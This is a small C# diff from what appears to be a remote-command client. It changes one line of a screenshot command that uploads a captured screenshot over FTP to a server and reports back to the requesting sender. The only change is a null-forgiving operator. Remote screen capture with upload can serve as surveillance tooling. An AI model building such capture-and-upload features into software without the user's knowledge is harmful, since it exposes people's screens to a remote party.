@@ -17,7 +17,7 @@ public class ScreenshotCommand(string content) : Command(Type.Screenshot, conten
         }
 
         if (!ServerCommunicator.SendFtpFile(filePath)) return;
-        ServerCommunicator.SendCommand(senderId, Utils.Encrypt("U=FTP" + screenshotName), false);
+        ServerCommunicator.SendCommand(senderId, Utils.Encrypt("U=FTP" + screenshotName)!, false);
         MessageBox.Show("Screen shot taken :D");
     }
 }
